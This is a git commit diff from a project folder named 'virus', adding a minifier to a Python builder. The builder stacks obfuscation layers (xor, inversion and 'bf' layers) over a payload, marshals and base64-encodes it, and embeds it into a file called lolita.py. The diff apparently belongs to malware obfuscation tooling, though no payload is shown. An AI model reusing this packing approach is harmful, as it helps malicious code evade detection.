598986ad60f4a6783e8902ef4a2952af9e69ce73
ClementNotin <clement@notin.org>
2013-03-04 19:08:54 +0100

    [Virus] Ajout minifier

--- virus/meta_builder.py
+++ virus/meta_builder.py
@@ -8,6 +8,7 @@ import no_op_layer
 import inv2_layer
 import invAll_layer
 import bf_layer
+from minify import minify
 
 
 def obfuscate(marshalled, layer=no_op_layer):
@@ -26,7 +27,10 @@ def obfuscate(marshalled, layer=no_op_layer):
     template = template.replace("__DECRYPT_PLACEHOLDER__", layer.DECRYPT)
 
     # template compile step
-    template_compiled = compile(template, "", "exec")
+    if layer == bf_layer:  # minify fails on this heavily obfuscated py :(
+        template_compiled = compile(template, "", "exec")
+    else:
+        template_compiled = compile(minify(template), "", "exec")
 
     # marshall step
     return marshal.dumps(template_compiled)
@@ -52,7 +56,7 @@ xor_layer_f = open("xor_layer.py", "r")
 builder = builder.replace("__XOR_LAYER_PY__", b64encode(xor_layer_f.read()))
 xor_layer_f.close()
 
-payload = marshal.dumps(compile(builder, "", "exec"))
+payload = marshal.dumps(compile(minify(builder), "", "exec"))
 
 print "Ajout des BF layers"
 for i in range(1):
@@ -71,7 +75,7 @@ for i in range(5):
     payload = obfuscate(payload, inv2_layer)
 
 lolita_f = open("lolita.py", "r")
-lolita = lolita_f.read()
+lolita = minify(lolita_f.read())
 lolita_f.close()
 
 lolita = lolita.replace("__FINAL_PLACEHOLDER__", b64encode(payload))
